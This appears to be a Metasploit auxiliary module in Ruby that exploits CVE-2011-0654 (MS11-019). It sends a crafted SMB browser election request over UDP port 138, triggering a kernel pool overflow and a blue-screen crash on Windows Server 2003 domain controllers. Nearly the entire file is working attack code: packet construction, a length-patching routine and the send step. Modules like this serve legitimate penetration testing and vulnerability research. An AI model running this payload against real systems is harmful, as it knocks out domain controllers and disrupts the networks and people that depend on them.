##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class Metasploit3 < Msf::Auxiliary
  Rank = ManualRanking

  include Msf::Exploit::Remote::Udp
  #include Msf::Exploit::Remote::SMB
  include Auxiliary::Dos

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Microsoft Windows Browser Pool DoS',
      'Description'    => %q{
          This module exploits a denial of service flaw in the Microsoft
        Windows SMB service on versions of Windows Server 2003 that have been
        configured as a domain controller. By sending a specially crafted election
        request, an attacker can cause a pool overflow.

        The vulnerability appears to be due to an error handling a length value
        while calculating the amount of memory to copy to a buffer. When there are
        zero bytes left in the buffer, the length value is improperly decremented
        and an integer underflow occurs. The resulting value is used in several
        calculations and is then passed as the length value to an inline memcpy
        operation.

        Unfortunately, the length value appears to be fixed at -2 (0xfffffffe) and
        causes considerable damage to kernel heap memory. While theoretically possible,
        it does not appear to be trivial to turn this vulnerability into remote (or
        even local) code execution.
      },
      'References'     =>
        [
          [ 'CVE', '2011-0654' ],
          [ 'BID', '46360' ],
          [ 'OSVDB', '70881' ],
          [ 'MSB', 'MS11-019' ],
          [ 'EDB', '16166' ],
          [ 'URL', 'http://seclists.org/fulldisclosure/2011/Feb/285' ]
        ],
      'Author'         => [ 'Cupidon-3005', 'jduck' ],
      'License'        => MSF_LICENSE
    ))

    register_options(
      [
        Opt::RPORT(138),
        OptString.new('DOMAIN', [ true, "The name of the domain that the target controls" ])
      ], self.class)
  end


  def run

    connect_udp
    @client = Rex::Proto::SMB::Client.new(udp_sock)

    ip = Rex::Socket.source_address(datastore['RHOST'])
    ip_src = Rex::Socket.gethostbyname(ip)[3]

    svc_src = "\x41\x41\x00"   # pre-encoded?
    name_src = Rex::Text.rand_text_alphanumeric(15) # 4+rand(10))

    svc_dst = "\x42\x4f\x00"   # pre-encoded?
    name_dst = datastore['DOMAIN']

    pipe = "\\MAILSLOT\\BROWSER"

    election =
      "\x08" +              # Election Request
      "\x09" +              # Election Version
      "\xa8" +              # election desire - Domain Master & WINS & NT
      "\x0f" +              # Browser Protocol Major Version
      "\x01" +              # Browser Protocol Minor Version
      "\x20" +              # Election OS (NT Server)
      "\x1b\xe9\xa5\x00" +  # Uptime
      "\x00\x00\x00\x00" +  # NULL... Padding?
      #("A" * 4) + "\x00"
      Rex::Text.rand_text_alphanumeric(410) + "\x00"

    nbdghdr =
      "\x11" +              # DIRECT_GROUP datagram
      "\x02" +              # first and only fragment
      [rand(0xffff)].pack('n') +  # Transation Id (DGM_ID)
      ip_src +
      "\x00\x8a" +          # Source Port (138)
      "\x00\xa7" +          # DGM_LENGTH, patched in after
      "\x00\x00"            # PACKET_OFFSET

    nbdgs = nbdghdr +
      half_ascii(name_src, svc_src) +
      half_ascii(name_dst, svc_dst)

    # A Trans request for the mailslot
    nbdgs << trans_mailslot(pipe, '', election)

    # Patch up the length (less the nb header)
    nbdgs[0x0a, 2] = [nbdgs.length - nbdghdr.length].pack('n')

    print_status("Sending specially crafted browser election request..")
    #print_status("\n" + Rex::Text.to_hex_dump(nbdgs))
    udp_sock.put(nbdgs)

    print_status("The target should encounter a blue screen error now.")

    disconnect_udp

  end


  # Perform a browser election request using the specified subcommand, parameters, and data
  def trans_mailslot(pipe, param = '', body = '')

    # Null-terminate the pipe parameter if needed
    if (pipe[-1,1] != "\x00")
      pipe << "\x00"
    end

    pkt = Rex::Proto::SMB::Constants::SMB_TRANS_PKT.make_struct
    @client.smb_defaults(pkt['Payload']['SMB'])

    setup_count = 3
    setup_data = [1, 0, 2].pack('v*')

    data = pipe + param + body

    base_offset = pkt.to_s.length + (setup_count * 2) - 4
    param_offset = base_offset + pipe.length
    data_offset = param_offset + param.length

    pkt['Payload']['SMB'].v['Command'] = Rex::Proto::SMB::Constants::SMB_COM_TRANSACTION
    pkt['Payload']['SMB'].v['Flags1'] = 0x0
    pkt['Payload']['SMB'].v['Flags2'] = 0x0
    pkt['Payload']['SMB'].v['WordCount'] = 14 + setup_count

    pkt['Payload'].v['ParamCountTotal'] = param.length
    pkt['Payload'].v['DataCountTotal'] = data.length
    pkt['Payload'].v['ParamCountMax'] = 0
    pkt['Payload'].v['DataCountMax'] = 0

    pkt['Payload'].v['ParamCount'] = param.length
    pkt['Payload'].v['ParamOffset'] = param_offset if param.length > 0
    pkt['Payload'].v['DataCount'] = body.length
    pkt['Payload'].v['DataOffset'] = data_offset
    pkt['Payload'].v['SetupCount'] = setup_count
    pkt['Payload'].v['SetupData'] = setup_data

    pkt['Payload'].v['Payload'] = data

    exploit = pkt.to_s

    # Strip off the netbios header (thx, but no thx!)
    exploit[4, exploit.length - 4]
  end


  def half_ascii(name, svc)
    ret = " "
    name.unpack('C*').each { |byte|
      ret << [0x41 + (byte >> 4)].pack('C')
      ret << [0x41 + (byte & 0xf)].pack('C')
    }
    left = 15 - name.length
    if left > 0
      ret << "\x43\x41" * left
    end

    # In our case, svc is already encoded..
    ret << svc
    ret
  end

end
